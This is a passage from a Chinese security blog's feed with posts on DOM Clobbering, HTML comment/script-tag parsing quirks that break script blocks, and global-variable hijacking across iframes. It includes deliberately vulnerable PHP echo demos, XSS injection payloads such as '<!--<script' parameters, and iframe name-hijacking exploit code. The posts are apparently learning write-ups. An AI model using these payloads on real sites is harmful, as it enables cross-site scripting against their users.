class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">DOM.innerHTML = <span class="string">'&lt;'</span>+html[i]+<span class="string">' id=x '</span>+prop+<span class="string">'=1&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)[prop] == <span class="number">1</span>) &#123;</span><br><span class="line">props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure><p>可以得到两个有趣的可利用属性 为username和password,但是这两个并非HTML属性，利用如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"http://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"ftp://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.username)<span class="comment">//Clobbered-username</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.password)<span class="comment">//Clobbered-password</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[<a href="http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]</a>(<a href="http://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack学习记录/)</p><p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">https://portswigger.net/research/dom-clobbering-strikes-back</a></p><p><a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Dom-Clobbering-Attack概述&quot;&gt;&lt;a href=&quot;#Dom-Clobbering-Attack概述&quot; class=&quot;headerlink&quot; title=&quot;Dom Clobbering Attack概述&quot;&gt;&lt;/a&gt;Dom Clobbering At
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Javascript中变量声明带来的Tags Broken</title>
    <link href="http://yoursite.com/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/"/>
    <id>http://yoursite.com/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/</id>
    <published>2020-04-09T08:16:05.000Z</published>
    <updated>2020-04-09T08:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题产生"><a href="#问题产生" class="headerlink" title="问题产生"></a>问题产生</h3><p><img src="https://s1.ax1x.com/2020/04/08/GW8xXt.png" alt="GW8xXt.png"></p><p>上文给出的例子如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看一下会造成的影响</p><p><img src="https://s1.ax1x.com/2020/04/08/GWGI3j.png" alt="GWGI3j.png"></p><p>很明显可见的是img标签以及下面的html全部被吃掉了</p><h3 id="原因探讨以及不同场景下的fuzz"><a href="#原因探讨以及不同场景下的fuzz" class="headerlink" title="原因探讨以及不同场景下的fuzz"></a>原因探讨以及不同场景下的fuzz</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>官方文档给出的解释如下：</p><blockquote><p>由于遗留原因，HTML元素中的“ <code>&lt;!--</code>”和“ <code>&lt;script</code>”字符串<code>script</code>需要进行平衡，以便解析器考虑关闭该块</p></blockquote><p>也就是说在<code>&lt;!--</code>的作用下<code>&lt;script&gt;</code>是要去和下面的<code>&lt;/script&gt;</code>闭合的，而<code>&lt;!--</code>的作用仍然是充当注释符作用，虽然<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>进行了闭合，但是因为注释符的原因，里面的内容并不会被解析</p><h4 id="注释状态下的其他语句解析"><a href="#注释状态下的其他语句解析" class="headerlink" title="注释状态下的其他语句解析"></a>注释状态下的其他语句解析</h4><p>通过测试发现这种注释语句还会带来标签内语句无法解析的效果</p><p>测试代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=alert(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然最后alert(1)也在script标签内 ，但是无法执行</p><p><img src="https://s1.ax1x.com/2020/04/09/G4XMqK.png" alt="G4XMqK.png"></p><h4 id="不同场景下的fuzz"><a href="#不同场景下的fuzz" class="headerlink" title="不同场景下的fuzz"></a>不同场景下的fuzz</h4><h5 id="标签的fuzz"><a href="#标签的fuzz" class="headerlink" title="标签的fuzz"></a>标签的fuzz</h5><p>这里主要是不同标签能否产生类似script这样的闭合进行的fuzz，结果发现，似乎只有具备script这样特性的标签才可以产生这样的效果。</p><p>并且必须要&lt;!–与<code>&lt;script&gt;</code>进行结合搭配才可以产生这样的效果，在只有&lt;!–和<code>&lt;script&gt;</code>的情况下都无法产生预期的结果</p><p>这里对为什么必须要二者结合在一起才能产生这样的效果进行了一个猜想：</p><p>在如下代码情况下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;!--</code>并未起到注释的效果可能是因为被变量的字符串作用域所限制，使得他只能是一个普通的字符串，而在如下的代码情况下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--&lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>的闭合导致后面的单引号失去了原本的作用，而&lt;!–也发挥了他本身的作用，所以最终导致的后果就是，红框里的内容全部当作了注释</p><p><img src="https://s1.ax1x.com/2020/04/08/GWWXCQ.png" alt="GWWXCQ.png"></p><p>需要注意的是：在这种情况下<code>&lt;script&gt;</code>里面的代码是完全无效的</p><p>探讨：</p><p>在测试完标签后发现了同样比较有趣的一点是如果我们直接在变量中声明<code>&lt;/script&gt;</code>，测试代码与效果如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line">        console.log(example);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/08/GW4KhD.png" alt="GW4KhD.png"></p><p>可以发现如果在变量中直接声明<code>&lt;/script&gt;</code>的话会直接和前面的<code>&lt;script&gt;</code>进了闭合，把单引号以及之后的内容都扔到了后面，产生了直接使后面代码无效化的影响</p><h4 id="字符串场景下的利用"><a href="#字符串场景下的利用" class="headerlink" title="字符串场景下的利用"></a>字符串场景下的利用</h4><p>漏洞利用场景如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload='<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>';</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.google.com"</span>;</span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对于这个页面的效果是在1000ms后自动跳转到谷歌，不过我们可以变量的设置来bypass这个跳转</p><p>实现如下：<br><img src="https://s1.ax1x.com/2020/04/08/Gf3bcR.png" alt="Gf3bcR.png"></p><h4 id="非字符串场景下的利用"><a href="#非字符串场景下的利用" class="headerlink" title="非字符串场景下的利用"></a>非字符串场景下的利用</h4><h5 id="非字符串下变量声明中-lt-–产生的问题"><a href="#非字符串下变量声明中-lt-–产生的问题" class="headerlink" title="非字符串下变量声明中&lt;!–产生的问题"></a>非字符串下变量声明中&lt;!–产生的问题</h5><p>如果对一个变量直接用如下方式赋值（在控制台）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;&lt;!--</span><br></pre></td></tr></table></figure><p>将一直处于输入状态</p><p>对于这个情况，可以前面一些字符或者数字进行避免</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;1&lt;!--</span><br></pre></td></tr></table></figure><p>最终a的值为1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=<span class="number">1</span>&lt;!--;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> b=<span class="number">2</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上js可正常执行</p><h5 id="应用场景探讨"><a href="#应用场景探讨" class="headerlink" title="应用场景探讨"></a>应用场景探讨</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.baidu.com"</span></span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用方式其实差不多</p><ul><li>在没有分号的情况的下可以用：<code>xss=&lt;!--&lt;script或者&lt;!--&lt;script&gt;</code></li><li>在有分号限制的情况下只有：<code>xss=&lt;!--&lt;script&gt;</code></li></ul><h5 id="进一步探讨"><a href="#进一步探讨" class="headerlink" title="进一步探讨"></a>进一步探讨</h5><p>在另一种结构下: 如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> location = <span class="string">'http://127.0.0.1'</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        test=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"><span class="actionscript">    &#125;<span class="keyword">catch</span>(err)&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        return location = '/?a='+<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//normal part</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们需要做的是不影响下面的正常js语句且能做到xss</p><p>而且特别需要注意的是在try中的代码时return location而非location，区别是</p><ul><li><p>return条件下：return完了之后的语句并不会执行</p></li><li><p>非return条件下：test和location都会被赋值操作</p></li></ul><p>也就是说非return条件下其实是无难度的xss。</p><p>这里我们采用的是<code>&lt;!--&lt;script</code>去闭合而非<code>&lt;!--&lt;script&gt;</code>，后者产生的注释直接会将后面的所有全部注释掉，无法再满足正常的js结构，并且此注释状态不可取消掉。</p><p>前者只会把script标签内的部分注释掉（因为没有闭合），并且可以通过特定语句来取消掉注释状态，所以我们现在可以传参<code>a=alert(1);&lt;!--script</code>，这样会符合正常的语句，但会直接location掉，所以我们再重新声明下location，再给一个报错就可以了</p><p>最终payload</p><p><img src="https://i.loli.net/2020/04/09/wj7HbMp8i4GDL9s.png" alt="TIM截图20200409160838.png"></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>文章内容还是有些地方不太成熟.见谅…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;问题产生&quot;&gt;&lt;a href=&quot;#问题产生&quot; class=&quot;headerlink&quot; title=&quot;问题产生&quot;&gt;&lt;/a&gt;问题产生&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/04/08/GW8xXt.png&quot; alt=&quot;GW8x
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>前端全局变量劫持</title>
    <link href="http://yoursite.com/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/"/>
    <id>http://yoursite.com/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/</id>
    <published>2020-04-06T12:13:46.000Z</published>
    <updated>2020-04-06T12:26:30.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>忙完了一些杂事，学一些新的东西吧（虽说心情有点难受</p><h3 id="iframe之间的访问与同源关系"><a href="#iframe之间的访问与同源关系" class="headerlink" title="iframe之间的访问与同源关系"></a>iframe之间的访问与同源关系</h3><h4 id="父页面访问子页面"><a href="#父页面访问子页面" class="headerlink" title="父页面访问子页面"></a>父页面访问子页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"id"</span>).contentWindow; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>[<span class="number">0</span>] ; <span class="comment">// 这个比较有意思， window 是本页面的window对象，window[0] 是子页面的window对象</span></span><br></pre></td></tr></table></figure><h4 id="子页面访问父页面"><a href="#子页面访问父页面" class="headerlink" title="子页面访问父页面"></a>子页面访问父页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.parent;  <span class="comment">//获取上一级的window对象，如果还是iframe则是该iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.top ;   <span class="comment">// 获取最顶级容器的window对象，即，就是你打开页面的文档</span></span><br></pre></td></tr></table></figure><h4 id="location与frame"><a href="#location与frame" class="headerlink" title="location与frame"></a>location与frame</h4><p>如果父和子页面是同源的，那么可以通过这个window对象获取到任何你想获取的内容，包括但是不限于 document,name,location 等。但是在非同源的情况下，iframe的window对象大多数的属性都会被同源策略block掉，但是有两个属性比较特殊。</p><ol><li>frames 可读，但是不可写。 意味着可以读取不同域的子页面里面的iframe的window对象</li><li>location 可写，但是不可读。意味着父子可以相互修改彼此的 location</li></ol><p>上述内容摘自wonderkun师傅博客（</p><h4 id="iframe同源跨域问题"><a href="#iframe同源跨域问题" class="headerlink" title="iframe同源跨域问题"></a>iframe同源跨域问题</h4><p>iframe所加载的子页面会被同源限制，所以无法对引入进来的iframe中的元素进行操作：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//localhost/JQuery Test/exp.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">'http://localhost/JQuery test/2.html'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/05/GD3Udx.png" alt="GD3Udx.png"></p><p>从上面的例子可以看出我们可以通过location进行同源设置来避免因为同源而被Block的情况，可成功获取name属性。</p><h3 id="name属性与id属性"><a href="#name属性与id属性" class="headerlink" title="name属性与id属性"></a>name属性与id属性</h3><p>name属性和id属性都可以注册为全局变量，如下：</p><p><img src="https://s1.ax1x.com/2020/04/05/GDt4MD.png" alt="GDt4MD.png"></p><h4 id="不可覆盖变量性"><a href="#不可覆盖变量性" class="headerlink" title="不可覆盖变量性"></a>不可覆盖变量性</h4><p>对于由id和name属性创建的变量 不可对已声明的变量进行覆盖 示例如下：</p><p><img src="https://s1.ax1x.com/2020/04/05/GDd0YR.png" alt="GDd0YR.png"></p><p>可以看到实际的变量并没有覆盖，所以对于这种攻击手法我们需要的是一个未定义的变量的。</p><p>、关于更多name和id属性的特性在下一篇Dom Clobbering再说吧。</p><h3 id="如何获得未定义的变量"><a href="#如何获得未定义的变量" class="headerlink" title="如何获得未定义的变量"></a>如何获得未定义的变量</h3><p>从上面的内容我们可以得知我们的攻击时进行的操作必须要在此变量未定义的情况下进行（因为我们通过id或name属性无法对已定义的变量进行覆盖）。</p><p>利用XSS-Auditor进行变量删除（不过需要注意的时XSS-Auditor在Chrome-78beta版本已经被废除)</p><p>利用方式：</p><p>通过参数提交恶意语句，即可进行删除变量，如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss&#x3D;&lt;script&gt;var lih3iu&#x3D;1&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>父页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">loaded</span><span class="params">(x)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        x.contentWindow.frames[<span class="number">0</span>].location = <span class="string">"http://A.com/index.html"</span>; <span class="comment">// 修改为跟A.com同源，这样在修改此iframe的name的时候就不会被同源策略block</span></span></span><br><span class="line"><span class="actionscript">        setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'setting viewer...'</span>);</span></span><br><span class="line"><span class="actionscript">            x.contentWindow.frames[<span class="number">0</span>].name = <span class="string">"lih3iu"</span>; <span class="comment">// 重新定义全局变量</span></span></span><br><span class="line">        &#125;,1000);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">    http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E</span></span><br><span class="line"><span class="comment">    利用chrome的filter模式去掉 VUL 的定义 </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E"</span> <span class="attr">onload</span>=<span class="string">"loaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>子页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B.com/B.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span 